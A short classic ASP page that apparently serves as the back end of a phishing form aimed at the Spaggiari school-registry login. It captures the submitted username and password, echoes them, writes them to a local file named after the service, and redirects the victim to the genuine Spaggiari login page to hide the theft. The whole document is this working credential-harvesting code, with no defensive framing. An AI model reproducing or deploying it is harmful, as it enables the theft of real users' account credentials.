<html>
    <head>
            <title> form </title>
    </head>
	<body>


        <% 
			nome = request.form("login")
            password=request.form("password")

            Response.write "il nome e': "& nome &"<br>"
            Response.write "la password e': "& password &"<br>"
            
            

            dim fs,f
            set fs=Server.CreateObject("Scripting.FileSystemObject")
            set f=fs.CreateTextFile("E:\spaggiari\prova.txt",true)
            f.writeLine(nome)
            f.writeLine(password)
            f.close
            set f=nothing
            set fs=nothing
            Response.Redirect("https://ar.spaggiari.eu/home/app/default/login.php")
		%>
    </body>
</html>